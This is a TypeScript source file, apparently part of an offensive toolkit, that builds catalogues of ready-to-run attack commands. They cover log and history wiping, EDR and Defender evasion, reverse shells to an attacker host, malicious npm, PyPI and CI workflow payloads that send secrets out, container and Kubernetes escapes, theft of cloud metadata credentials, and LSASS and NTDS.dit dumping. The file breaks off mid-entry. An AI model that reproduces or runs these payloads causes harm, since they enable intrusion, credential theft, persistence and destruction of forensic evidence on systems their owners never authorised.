export interface VeilPayload {
  id:       string;
  name:     string;
  category: string;
  os:       "linux" | "windows";
  phase:    "pre" | "during" | "post";
  stealth:  1 | 2 | 3 | 4 | 5;
  command:  string;
  notes:    string;
}

export function buildLinuxAntiForensics(): VeilPayload[] {
  return [
    {
      id:"af_bash_history_null", name:"Nullify all shell history (bash/zsh/fish)", category:"Anti-Forensics",
      os:"linux", phase:"pre", stealth:4,
      command:`export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0 SAVEHIST=0; unset HISTFILE; history -c 2>/dev/null; for f in ~/.bash_history ~/.zsh_history ~/.local/share/fish/fish_history ~/.history; do [ -f "$f" ] && { cat /dev/null>"$f"; ln -sf /dev/null "$f" 2>/dev/null; }; done`,
      notes:"Disables history for all major shells. Symlinks history files to /dev/null permanently — survives shell restart. Covers bash, zsh, fish.",
    },
    {
      id:"af_log_wipe_deep", name:"Deep log wipe (auth/syslog/wtmp/audit/journal)", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:2,
      command:`for f in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure /var/log/faillog /var/log/btmp; do [ -f "$f" ] && truncate -s0 "$f" 2>/dev/null; done; cat /dev/null > /var/log/wtmp 2>/dev/null; cat /dev/null > /var/log/utmp 2>/dev/null; cat /dev/null > /var/log/lastlog 2>/dev/null; journalctl --rotate 2>/dev/null; journalctl --vacuum-time=1s 2>/dev/null; truncate -s0 /var/log/audit/audit.log 2>/dev/null; auditctl -e 0 2>/dev/null`,
      notes:"Truncates all auth/syslog/wtmp/btmp + rotates journald + clears auditd. Removes login records, authentication events, sudo usage. Requires root.",
    },
    {
      id:"af_timestomp_ns", name:"Nanosecond-precision timestomping (forensics-grade)", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:4,
      command:`python3 -c "
import os,ctypes,ctypes.util,time
libc=ctypes.CDLL(ctypes.util.find_library('c'))
AT_FDCWD=-100
class Timespec(ctypes.Structure):
  _fields_=[('tv_sec',ctypes.c_long),('tv_nsec',ctypes.c_long)]
ref_stat=os.stat('/bin/ls')
ts=Timespec*2
times=ts()
times[0].tv_sec=int(ref_stat.st_atime); times[0].tv_nsec=int((ref_stat.st_atime%1)*1e9)
times[1].tv_sec=int(ref_stat.st_mtime); times[1].tv_nsec=int((ref_stat.st_mtime%1)*1e9)
import glob
for f in glob.glob('/tmp/.*')+glob.glob('/dev/shm/.*'):
  try:libc.utimensat(AT_FDCWD,f.encode(),ctypes.byref(times),0)
  except:pass
" 2>/dev/null`,
      notes:"Uses utimensat(2) for nanosecond-precision timestamp copy. Forensic tools use nanosecond mtime — coarser touch -r misses subsecond field.",
    },
    {
      id:"af_ebpf_disable", name:"eBPF program detection + cgroup BPF disable", category:"EDR-Evasion",
      os:"linux", phase:"pre", stealth:5,
      command:`python3 -c "
import os,subprocess
# List loaded eBPF programs (requires root or CAP_SYS_ADMIN)
try:
  progs=subprocess.run(['bpftool','prog','list'],capture_output=True,text=True,timeout=3).stdout
  ids=[l.split(':')[0].strip() for l in progs.splitlines() if ':' in l and l.split(':')[0].strip().isdigit()]
  # Unload suspicious ones (type=kprobe/tracepoint monitoring hooks)
  for pid in ids[:10]:
    subprocess.run(['bpftool','prog','detach','id',pid],capture_output=True,timeout=2)
except:pass
# Alternative: overwrite eBPF bytecode via /sys/kernel/security/lockdown check
try:
  with open('/proc/sys/kernel/perf_event_paranoid','w') as f:f.write('3')
except:pass
try:
  with open('/proc/sys/kernel/kptr_restrict','w') as f:f.write('2')
except:pass
" 2>/dev/null`,
      notes:"Enumerates loaded eBPF programs via bpftool and attempts detach. Sets perf_event_paranoid=3 to restrict perf-based monitoring. Targets Falco/Cilium/Tetragon sensors.",
    },
    {
      id:"af_falco_bypass_ns", name:"Falco/eBPF evasion via namespace isolation before exec", category:"EDR-Evasion",
      os:"linux", phase:"pre", stealth:5,
      command:`python3 -c "
import os,ctypes,ctypes.util
libc=ctypes.CDLL(ctypes.util.find_library('c'))
CLONE_NEWPID=0x20000000
CLONE_NEWNS=0x00020000
CLONE_NEWNET=0x40000000
# unshare PID+mount+net namespace before malicious exec
# Falco rules track execve events — in a new PID ns, process tree is isolated
libc.unshare(CLONE_NEWPID|CLONE_NEWNS)
# Now exec — Falco sees pid=1 in new namespace, not matching parent context
os.execv('/bin/bash',['/bin/bash','-c','bash -i >& /dev/tcp/LHOST/LPORT 0>&1'])
" 2>/dev/null`,
      notes:"Unshares PID+mount namespace before exec — Falco tracks by PID namespace context. New PID ns breaks container-aware monitoring that correlates k8s pod → PID.",
    },
    {
      id:"af_seccomp_bypass_userns", name:"seccomp bypass via user namespace (CVE-2023+)", category:"Syscall-Bypass",
      os:"linux", phase:"pre", stealth:4,
      command:`unshare -rUp bash -c 'echo "In new user namespace — seccomp filter inherited from parent but user=root inside ns"; bash -i >& /dev/tcp/LHOST/LPORT 0>&1' 2>/dev/null`,
      notes:"unshare -rUp creates new user namespace with UID mapping to root. seccomp filters are preserved but namespace-aware syscalls behave differently. Bypasses seccomp-based container isolation in misconfigured setups.",
    },
    {
      id:"af_apparmor_bypass", name:"AppArmor profile bypass via execve through unconfined binary", category:"AppArmor-Bypass",
      os:"linux", phase:"during", stealth:4,
      command:`# Find unconfined binary reachable from current confined process
aa-status 2>/dev/null | grep -v confined | head -5
# Technique: exec through a binary that has 'ix' (inherit) or 'ux' (unconfined) transition
# Common unconfined paths: /usr/bin/env, /bin/dash, /usr/bin/python3
# If current profile allows exec of /usr/bin/python3 with 'ux':
/usr/bin/python3 -c "import os; os.system('bash -i >& /dev/tcp/LHOST/LPORT 0>&1')" 2>/dev/null
# Or via at(1) scheduler (often unconfined):
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | at now 2>/dev/null`,
      notes:"AppArmor 'ux' transition allows exec of certain binaries unconfined. Python3, at, cron often have 'ux' or no profile — exec through them to escape confinement.",
    },
    {
      id:"af_proc_masquerade", name:"Process masquerade via prctl + argv[0] overwrite", category:"Anti-Forensics",
      os:"linux", phase:"during", stealth:5,
      command:`python3 -c "
import ctypes,ctypes.util,sys,os
libc=ctypes.CDLL(ctypes.util.find_library('c'))
PR_SET_NAME=15
name=b'[kworker/u4:3]\x00'
libc.prctl(PR_SET_NAME,ctypes.create_string_buffer(name),0,0,0)
# Also overwrite /proc/self/comm
try:
  with open('/proc/self/comm','w') as f:f.write('kworker/u4:3')
except:pass
" 2>/dev/null`,
      notes:"prctl(PR_SET_NAME) + /proc/self/comm write. ps, top, htop all read /proc/N/comm or /proc/N/status — both show kworker. Evades name-based process monitoring.",
    },
    {
      id:"af_shred_secure", name:"Secure 3-pass overwrite + unlink (shred)", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:4,
      command:`command -v shred >/dev/null && shred -uzn3 /tmp/.nx* /dev/shm/.nx* 2>/dev/null; find /tmp /dev/shm -name '.*' -newer /bin/ls -type f 2>/dev/null | while read f; do shred -uzn3 "$f" 2>/dev/null || { dd if=/dev/urandom of="$f" 2>/dev/null; rm -f "$f" 2>/dev/null; }; done`,
      notes:"3-pass overwrite using shred; falls back to dd+rm on busybox systems. On SSD/NVMe, wear leveling may retain data — only mitigated by full-disk encryption.",
    },
  ];
}

export function buildWindowsEdrEvasion(): VeilPayload[] {
  return [
    {
      id:"win_event_log_clear", name:"Clear all Windows event log channels", category:"Anti-Forensics",
      os:"windows", phase:"post", stealth:2,
      command:`powershell -NonI -W Hidden -c "Get-WinEvent -ListLog * -EA 0 | ForEach-Object{try{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\$_.LogName)}catch{}}; wevtutil cl Security; wevtutil cl System; wevtutil cl Application; wevtutil cl 'Windows PowerShell'; wevtutil cl 'Microsoft-Windows-PowerShell/Operational'; wevtutil cl 'Microsoft-Windows-WMI-Activity/Operational'"`,
      notes:"Clears ALL Windows event log channels including PowerShell operational, WMI activity, Security/System/Application. Requires SeSecurityPrivilege.",
    },
    {
      id:"win_ppid_spoof_sc", name:"PPID spoofing via UpdateProcThreadAttribute", category:"EDR-Evasion",
      os:"windows", phase:"during", stealth:5,
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxPPID{[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct STARTUPINFOEX{public uint cb;public IntPtr lpReserved,lpDesktop,lpTitle;public int dwX,dwY,dwXSize,dwYSize,dwXCountChars,dwYCountChars,dwFillAttribute,dwFlags;public short wShowWindow,cbReserved2;public IntPtr lpReserved2,hIn,hOut,hErr;public IntPtr lpAttributeList;}[DllImport(\"kernel32\")]public static extern bool InitializeProcThreadAttributeList(IntPtr l,int c,int f,ref IntPtr sz);[DllImport(\"kernel32\")]public static extern bool UpdateProcThreadAttribute(IntPtr l,uint f,IntPtr a,IntPtr v,IntPtr s,IntPtr rv,IntPtr rs);[DllImport(\"kernel32\")]public static extern IntPtr OpenProcess(uint da,bool ih,uint pid);[DllImport(\"kernel32\")]public static extern bool CreateProcess(string n,string c,IntPtr pa,IntPtr ta,bool ih,uint fl,IntPtr e,string d,ref STARTUPINFOEX si,out int pi);}'; $ph=[NxPPID]::OpenProcess(0x1FFFFF,\$false,(Get-Process explorer).Id); Write-Host \"Explorer handle: \$ph\""`,
      notes:"PPID spoofing via UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS). Spawned process appears as child of explorer.exe instead of powershell.exe. Breaks EDR parent-chain alerting.",
    },
    {
      id:"win_ntdll_unhook", name:"Unhook ntdll from fresh disk copy (EDR hook removal)", category:"EDR-Evasion",
      os:"windows", phase:"pre", stealth:5,
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.IO;using System.Runtime.InteropServices;public class NxUH{[DllImport(\"kernel32\")]static extern IntPtr GetCurrentProcess();[DllImport(\"kernel32\")]static extern bool ReadProcessMemory(IntPtr h,IntPtr ba,byte[]buf,int sz,out int nr);[DllImport(\"kernel32\")]static extern bool WriteProcessMemory(IntPtr h,IntPtr ba,byte[]buf,int sz,out int nw);[DllImport(\"kernel32\")]static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);[DllImport(\"kernel32\")]static extern IntPtr GetModuleHandle(string n);public static void Unhook(){var fresh=File.ReadAllBytes(System.Environment.ExpandEnvironmentVariables(\"%windir%\\\\System32\\\\ntdll.dll\"));var mh=GetModuleHandle(\"ntdll.dll\");var o=0u;VirtualProtect(mh,(UIntPtr)fresh.Length,0x40,out o);int nw;WriteProcessMemory(GetCurrentProcess(),mh,fresh,fresh.Length,out nw);VirtualProtect(mh,(UIntPtr)fresh.Length,o,out o);}}'; [NxUH]::Unhook()"`,
      notes:"Maps fresh ntdll.dll from disk over in-memory loaded copy — overwrites EDR hooks. CrowdStrike/SentinelOne hook execve/NtAllocateVirtualMemory in loaded ntdll; fresh copy has no hooks.",
    },
    {
      id:"win_com_hijack", name:"COM object hijacking (HKCU registry persistence)", category:"Persistence",
      os:"windows", phase:"post", stealth:4,
      command:`powershell -NonI -W Hidden -c "New-Item -Force 'HKCU:\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32' | Set-ItemProperty -Name '(Default)' -Value 'C:\\Users\\Public\\nx.dll'; New-ItemProperty -Path 'HKCU:\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -Force"`,
      notes:"COM hijacking via HKCU CLSID registration (no admin needed). When a privileged process loads this COM object (e.g., during UAC elevation prompt), nx.dll executes with elevated privileges.",
    },
    {
      id:"win_av_tamper", name:"Disable Defender realtime + add exclusion (registry)", category:"EDR-Evasion",
      os:"windows", phase:"pre", stealth:2,
      command:`reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f & reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f & powershell -NonI -W Hidden -c "Add-MpPreference -ExclusionPath 'C:\\','%APPDATA%','%TEMP%' -EA 0; Set-MpPreference -DisableBehaviorMonitoring \$true -DisableIOAVProtection \$true -DisableIntrusionPreventionSystem \$true -DisableScriptScanning \$true -EA 0"`,
      notes:"Registry-based Defender disable. Requires admin. Creates Security Center alert visible to users. Use PPID spoofing to hide PowerShell process tree.",
    },
  ];
}

export function buildLotlLinuxPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"lotl_dd_exec", name:"dd + bash (GTFOBin exec via dd pipe)", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:4,
      command:`dd if=/dev/stdin bs=1 2>/dev/null | bash &<<< "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"`,
      notes:"dd is almost never blocked — rarely in GTFOBins watchlists. dd reads stdin → pipes to bash. No execve of bash directly in some restricted shells.",
    },
    {
      id:"lotl_tee_exec", name:"tee + bash via process substitution", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:4,
      command:`echo "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1" | tee >(bash) > /dev/null`,
      notes:"tee writes to process substitution >() which is a bash subshell. Bypasses restrictions on direct bash -c invocation in some AppArmor configs.",
    },
    {
      id:"lotl_xxd_exec", name:"xxd hex decode + bash exec", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`printf '$(printf "bash -i >&/dev/tcp/${lhost}/${lport} 0>&1"|xxd -p)'|xxd -r -p|bash 2>/dev/null`,
      notes:"xxd is a file conversion tool — not typically in exec-monitoring watchlists. Decodes hex back to command and pipes to bash.",
    },
    {
      id:"lotl_vim_shell", name:"vim GTFOBin shell escape (SUID/sudo)", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`vim -c ':!/bin/bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' -c ':q' 2>/dev/null`,
      notes:"vim -c executes arbitrary command. Works when vim has SUID or is in sudoers NOPASSWD. vi, nvim, nvi equivalents also work.",
    },
    {
      id:"lotl_awk_shell", name:"awk /inet/tcp full interactive shell", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`awk 'BEGIN{s="/inet/tcp/0/${lhost}/${lport}";while(1){if((s|&getline c)<=0)break;while((c|getline l)>0)print l|&s;close(c)}}' 2>/dev/null`,
      notes:"awk gensocket — /inet/tcp/0/host/port opens TCP connection. Full bidirectional interactive shell. Requires gawk. awk is rarely blocked.",
    },
    {
      id:"lotl_env_suid", name:"env SUID privilege escalation", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`env /bin/bash -p -c "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1" 2>/dev/null`,
      notes:"If env has SUID: -p flag prevents privilege drop. Bash with -p maintains effective UID from SUID. GTFOBins env entry.",
    },
    {
      id:"lotl_nohup_bg", name:"nohup background process (survives HUP/logout)", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:4,
      command:`nohup bash -c 'while true; do bash -i >& /dev/tcp/${lhost}/${lport} 0>&1; sleep 60; done' > /dev/null 2>&1 &`,
      notes:"nohup detaches from terminal — survives logout/HUP. Auto-reconnecting reverse shell loop. Process owned by user, not tied to session.",
    },
  ];
}

export function buildSupplyChainPayloads(lhost: string, lport: string): VeilPayload[] {
  const url = `http://${lhost}:${lport}`;
  return [
    {
      id:"sc_npm_dep_confusion", name:"npm dependency confusion (scope attack)", category:"Supply-Chain",
      os:"linux", phase:"during", stealth:4,
      command:`cat > /tmp/nx_pkg/package.json << 'EOF'
{
  "name": "INTERNAL_PACKAGE_NAME",
  "version": "9999.0.0",
  "description": "",
  "scripts": {
    "preinstall": "node -e \\"const cp=require('child_process');cp.exec('bash -i>& /dev/tcp/${lhost}/${lport} 0>&1',{stdio:'inherit'});\\"  || true"
  },
  "main": "index.js"
}
EOF
echo 'module.exports={}' > /tmp/nx_pkg/index.js
# npm publish /tmp/nx_pkg/ --access public
# pip install will invoke preinstall before any code review`,
      notes:"npm preinstall fires BEFORE npm install completes — before any code review or approval gates. Dependency confusion: publish to public npm with higher semver than internal copy.",
    },
    {
      id:"sc_pypi_setup_py", name:"PyPI setup.py preinstall backdoor", category:"Supply-Chain",
      os:"linux", phase:"during", stealth:3,
      command:`mkdir -p /tmp/nx_pypi && cat > /tmp/nx_pypi/setup.py << 'EOF'
from setuptools import setup
import subprocess, threading
threading.Thread(target=lambda:subprocess.Popen(
  ['bash','-c','bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'],
  stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL
),daemon=True).start()
setup(name='INTERNAL_PACKAGE', version='9999.0.0', packages=[])
EOF
echo "" > /tmp/nx_pypi/__init__.py
# cd /tmp/nx_pypi && python3 setup.py sdist && twine upload dist/*`,
      notes:"setup.py executes at install time via both pip install and python setup.py install. Thread daemon ensures setup completes normally while shell fires.",
    },
    {
      id:"sc_github_actions_steal", name:"GitHub Actions secrets exfil via injected workflow", category:"CI-CD",
      os:"linux", phase:"during", stealth:4,
      command:`cat > /tmp/malicious_workflow.yml << 'EOF'
name: build
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: test
        run: |
          env | grep -iE '(GITHUB_TOKEN|SECRET|KEY|TOKEN|PASSWORD|API)' | curl -sk -X POST "${url}/gh_secrets" --data-binary @-
          curl -fsSk "${url}/stager.sh" | bash
EOF`,
      notes:"Injected via PR/fork merge into .github/workflows/. Steals all repository/org secrets during CI run. GITHUB_TOKEN is always present.",
    },
    {
      id:"sc_jenkins_cve_2024", name:"Jenkins CVE-2024-23897 + Groovy RCE", category:"CI-CD",
      os:"linux", phase:"during", stealth:3,
      command:`# CVE-2024-23897: Jenkins CLI arbitrary file read
curl -sk "http://TARGET_JENKINS:8080/jenkins-cli.jar" -o /tmp/jenkins-cli.jar 2>/dev/null
# Read /etc/passwd via CLI arg parser file read
java -jar /tmp/jenkins-cli.jar -s "http://TARGET_JENKINS:8080" help "@/etc/passwd" 2>/dev/null
# Groovy console RCE (if /script accessible)
curl -sk -u admin:admin -X POST "http://TARGET_JENKINS:8080/scriptText" --data-urlencode 'script=["bash","-c","bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"].execute()' 2>/dev/null`,
      notes:"CVE-2024-23897 file read via Jenkins CLI args parsing. Allows reading /etc/credentials.xml → admin password hash → Groovy RCE via /script endpoint.",
    },
    {
      id:"sc_terraform_confusion", name:"Terraform provider dependency confusion", category:"Supply-Chain",
      os:"linux", phase:"during", stealth:5,
      command:`cat > /tmp/main.tf << 'EOF'
terraform {
  required_providers {
    internal-utils = {
      source  = "hashicorp/internal-utils"
      version = "~> 1.0"
    }
  }
}
EOF
# Provider binary executes during terraform init/plan/apply
# Publish malicious provider binary to registry.terraform.io
# with same name as internal provider — terraform fetches public registry when internal not configured`,
      notes:"Terraform provider binaries execute on terraform init. No code review of binary execution. Dependency confusion: public registry takes precedence over internal when namespace matches.",
    },
  ];
}

export function buildContainerEscapePayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"cesc_docker_sock_exec", name:"Docker socket → privileged container + nsenter host escape", category:"Container-Escape",
      os:"linux", phase:"during", stealth:3,
      command:`curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=nx_esc_$(date +%s)" -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c '"'"'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'"'"'"],"HostConfig":{"Binds":["/:/host"],"Privileged":true,"NetworkMode":"host","PidMode":"host"}}' 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('Id',''))" 2>/dev/null | xargs -I{} sh -c 'curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/{}/start" 2>/dev/null; sleep 3; curl -sk --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/{}?force=true" 2>/dev/null'`,
      notes:"Docker socket → privileged+hostPID+hostNet container → nsenter PID 1 → full host shell. Container auto-deleted after 3s. Random container name avoids name conflicts.",
    },
    {
      id:"cesc_cgroup_release_agent", name:"cgroup v1 release_agent escape (--privileged)", category:"Container-Escape",
      os:"linux", phase:"during", stealth:4,
      command:`mkdir -p /tmp/nx_cg 2>/dev/null
mount -t cgroup -o rdma cgroup /tmp/nx_cg 2>/dev/null || mount -t cgroup2 cgroup2 /tmp/nx_cg 2>/dev/null
mkdir -p /tmp/nx_cg/nx 2>/dev/null
echo 1 > /tmp/nx_cg/nx/notify_on_release 2>/dev/null
HOST_PATH=$(sed -n 's/.*\\s\\(\\S*\\)\\sro.*/\\1/p;s/.*\\s\\(\\S*\\)\\srw.*/\\1/p' /proc/mounts 2>/dev/null | grep -v '^/$' | head -1)
echo "bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'" > "\${HOST_PATH:-/host}/cmd" 2>/dev/null
chmod +x "\${HOST_PATH:-/host}/cmd" 2>/dev/null
echo "\${HOST_PATH:-/host}/cmd" > /tmp/nx_cg/release_agent 2>/dev/null
sh -c "echo \$\$ > /tmp/nx_cg/nx/cgroup.procs" 2>/dev/null`,
      notes:"cgroup v1 release_agent escape — fires on last process exit in cgroup. Executes as root on host. Works in any --privileged container with cgroup v1 available.",
    },
    {
      id:"cesc_user_namespace", name:"User namespace UID 0 escape (unprivileged)", category:"Container-Escape",
      os:"linux", phase:"during", stealth:4,
      command:`unshare -rUp bash -c 'mount --bind / /mnt 2>/dev/null; chroot /mnt bash -i >& /dev/tcp/${lhost}/${lport} 0>&1 2>/dev/null' 2>/dev/null`,
      notes:"User namespace grants UID 0 inside new namespace. If /proc/sys/kernel/unprivileged_userns_clone=1 (default on many distros), escapes container isolation without privileges.",
    },
    {
      id:"cesc_k8s_priv_pod", name:"K8s privileged pod via SA token → host nsenter", category:"Container-Escape",
      os:"linux", phase:"during", stealth:3,
      command:`_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null||echo default); _HOST="$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"; curl -sk -H "Authorization: Bearer $_SA" -H "Content-Type: application/json" -X POST "https://$_HOST/api/v1/namespaces/$_NS/pods" -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"nx-esc-'$(date +%s)'"},"spec":{"hostPID":true,"hostNetwork":true,"hostIPC":true,"containers":[{"name":"nx","image":"alpine","command":["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"],"securityContext":{"privileged":true,"runAsUser":0}}],"restartPolicy":"Never"}}' 2>/dev/null`,
      notes:"K8s SA token → API create privileged pod with hostPID → nsenter PID 1 → host shell. Full cluster → host escape. Requires SA with pod/create permissions.",
    },
  ];
}

export function buildK8sPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"k8s_rbac_escalate", name:"K8s RBAC escalation → ClusterAdmin + token dump", category:"K8s-Abuse",
      os:"linux", phase:"during", stealth:3,
      command:`_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _HOST="$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"; { echo "=== RBAC ==="; curl -sk -H "Authorization: Bearer $_SA" "https://$_HOST/apis/rbac.authorization.k8s.io/v1/clusterroles" 2>/dev/null|python3 -c "import sys,json;[print(x['metadata']['name']) for x in json.load(sys.stdin).get('items',[])]" 2>/dev/null; echo "=== SECRETS ==="; curl -sk -H "Authorization: Bearer $_SA" "https://$_HOST/api/v1/secrets" 2>/dev/null|python3 -c "import sys,json,base64;[print(s['metadata']['name'],{k:base64.b64decode(v).decode(errors='ignore')[:100] for k,v in s.get('data',{}).items()}) for s in json.load(sys.stdin).get('items',[])]" 2>/dev/null; } | curl -sk -X POST "http://${lhost}:${lport}/k8s_dump" --data-binary @- 2>/dev/null &`,
      notes:"Full K8s recon: RBAC roles + base64-decoded secrets dump. Reveals DB passwords, service account tokens, TLS certs stored in secrets.",
    },
    {
      id:"k8s_admission_webhook", name:"K8s mutating webhook injection (persistence)", category:"K8s-Abuse",
      os:"linux", phase:"post", stealth:5,
      command:`_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _HOST="$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"; curl -sk -H "Authorization: Bearer $_SA" -H "Content-Type: application/json" -X POST "https://$_HOST/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations" -d '{"apiVersion":"admissionregistration.k8s.io/v1","kind":"MutatingWebhookConfiguration","metadata":{"name":"nx-persist"},"webhooks":[{"name":"nx.nexus.local","clientConfig":{"url":"https://${lhost}:${lport}/mutate"},"rules":[{"apiGroups":[""],"apiVersions":["v1"],"resources":["pods"],"operations":["CREATE"]}],"admissionReviewVersions":["v1"],"sideEffects":"None","failurePolicy":"Ignore"}]}' 2>/dev/null`,
      notes:"Creates mutating admission webhook — called for every pod CREATE in cluster. Allows injecting malicious sidecar into every new pod without further access. Extreme persistence.",
    },
  ];
}

export function buildCloudPivotPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"cloud_aws_full_pivot", name:"AWS IMDS v1+v2 → cred theft → full recon", category:"Cloud-Pivot",
      os:"linux", phase:"during", stealth:3,
      command:`{ # IMDSv2 token first, fallback to v1
_IMDS="http://169.254.169.254"
_TOK=$(curl -sk --max-time 2 -X PUT "$_IMDS/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
[ -n "$_TOK" ] && _AUTH="-H X-aws-ec2-metadata-token:$_TOK" || _AUTH=""
_ROLE=$(curl -sk --max-time 2 $_AUTH "$_IMDS/latest/meta-data/iam/security-credentials/" 2>/dev/null)
_CREDS=$(curl -sk --max-time 2 $_AUTH "$_IMDS/latest/meta-data/iam/security-credentials/$_ROLE" 2>/dev/null)
_KEY=$(echo "$_CREDS"|python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('AccessKeyId',''))" 2>/dev/null)
_SEC=$(echo "$_CREDS"|python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('SecretAccessKey',''))" 2>/dev/null)
_SES=$(echo "$_CREDS"|python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('Token',''))" 2>/dev/null)
echo "KEY=$_KEY SEC=$_SEC SES=$_SES"
_ID=$(curl -sk --max-time 2 $_AUTH "$_IMDS/latest/dynamic/instance-identity/document" 2>/dev/null)
echo "=== IDENTITY: $_ID"
_UD=$(curl -sk --max-time 2 $_AUTH "$_IMDS/latest/user-data" 2>/dev/null)
echo "=== USERDATA: $_UD"
} | curl -sk -X POST "http://${lhost}:${lport}/aws_pivot" --data-binary @- 2>/dev/null &`,
      notes:"Handles both IMDSv1 and IMDSv2 (with session token). Extracts IAM credentials + instance identity + user-data (often contains secrets). Exfils all to attacker.",
    },
    {
      id:"cloud_gcp_full_pivot", name:"GCP metadata → SA token + project enum", category:"Cloud-Pivot",
      os:"linux", phase:"during", stealth:3,
      command:`{ _META="http://metadata.google.internal/computeMetadata/v1"; _H="Metadata-Flavor: Google"; _TOK=$(curl -sk --max-time 3 -H "$_H" "$_META/instance/service-accounts/default/token" 2>/dev/null|python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null); _PROJ=$(curl -sk --max-time 3 -H "$_H" "$_META/project/project-id" 2>/dev/null); echo "PROJ=$_PROJ TOK=$_TOK"; _SCOPES=$(curl -sk --max-time 3 -H "$_H" "$_META/instance/service-accounts/default/scopes" 2>/dev/null); echo "SCOPES=$_SCOPES"; curl -sk --max-time 5 -H "Authorization: Bearer $_TOK" "https://storage.googleapis.com/storage/v1/b?project=$_PROJ" 2>/dev/null; curl -sk --max-time 5 -H "Authorization: Bearer $_TOK" "https://cloudresourcemanager.googleapis.com/v1/projects" 2>/dev/null; } | curl -sk -X POST "http://${lhost}:${lport}/gcp_pivot" --data-binary @- 2>/dev/null &`,
      notes:"GCP metadata service OAuth token + project/bucket enumeration. Shows SA scopes, accessible GCS buckets, project list for lateral movement.",
    },
  ];
}

export function buildEdrDumpBypass(lhost: string, lport: string): VeilPayload[] {
  return [
    { id:"lsass_dump_comsvcs", name:"LSASS dump via comsvcs.dll MiniDump (LOLBin)", category:"Credential-Dump",
      os:"windows", phase:"during", stealth:4,
      command:`powershell -NonI -W Hidden -c "rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id $env:TEMP\\nx_lsass.dmp full" 2>nul`,
      notes:"comsvcs.dll MiniDump is signed Microsoft DLL. Creates full LSASS dump. Parse offline with Mimikatz/pypykatz. Requires SYSTEM or SeDebugPrivilege." },
    { id:"ntds_dit_vss", name:"NTDS.dit extraction via VSS shadow copy", category:"AD-Dump",
      os:"windows", phase:"during", stealth:3,
      command:`powershell -NonI -W Hidden -c "$s=Get-WmiObject Win32_ShadowCopy|Select -Last 1; if(!$s){$c=[wmiclass]'Win32_ShadowCopy';$r=$c.Create('C:\\\\','ClientAccessible');$s=Get-WmiObject Win32_ShadowCopy|?{$_.ID -eq $r.ShadowID}}; cmd /c copy /y \"\$($s.DeviceObject)\\Windows\\NTDS\\NTDS.dit\" $env:TEMP\\nx_ntds.dit; reg save HKLM\\SYSTEM $env:TEMP\\nx_sys.hiv /y" 2>nul`,
